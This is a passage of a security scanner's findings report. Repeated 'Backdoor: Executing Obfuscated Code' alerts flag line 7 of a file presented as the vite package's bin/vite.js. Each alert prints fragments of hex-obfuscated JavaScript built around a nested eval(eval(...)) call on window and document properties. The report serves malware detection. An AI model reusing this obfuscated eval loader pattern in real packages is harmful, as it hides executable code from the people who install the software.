                      "markdown": "`,rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 315,
                  "endLine": 7,
                  "endColumn": 335,
                  "snippet": {
                    "text": "hb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x",
                    "rendered": {
                      "text": "hb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x",
                      "markdown": "`hb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 246,
                  "endLine": 7,
                  "endColumn": 266,
                  "snippet": {
                    "text": "6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yi",
                    "rendered": {
                      "text": "6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yi",
                      "markdown": "`6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 200,
                  "endLine": 7,
                  "endColumn": 220,
                  "snippet": {
                    "text": "d = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[",
                    "rendered": {
                      "text": "d = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[",
                      "markdown": "`d = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 158,
                  "endLine": 7,
                  "endColumn": 178,
                  "snippet": {
                    "text": "38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x",
                    "rendered": {
                      "text": "38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x",
                      "markdown": "`38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 112,
                  "endLine": 7,
                  "endColumn": 132,
                  "snippet": {
                    "text": "\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x",
                    "rendered": {
                      "text": "\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x",
                      "markdown": "`\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 66,
                  "endLine": 7,
                  "endColumn": 86,
                  "snippet": {
                    "text": "33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x3",
                    "rendered": {
                      "text": "33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x3",
                      "markdown": "`33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x39\\x37\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x32\\x37\\x31\\x32\\x38\\x32\"];\nvar zaanr = srdzy = aashy = aenbd = yieeb = window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"],\n    rihhb = window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x3`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 20,
                  "endLine": 7,
                  "endColumn": 40,
                  "snippet": {
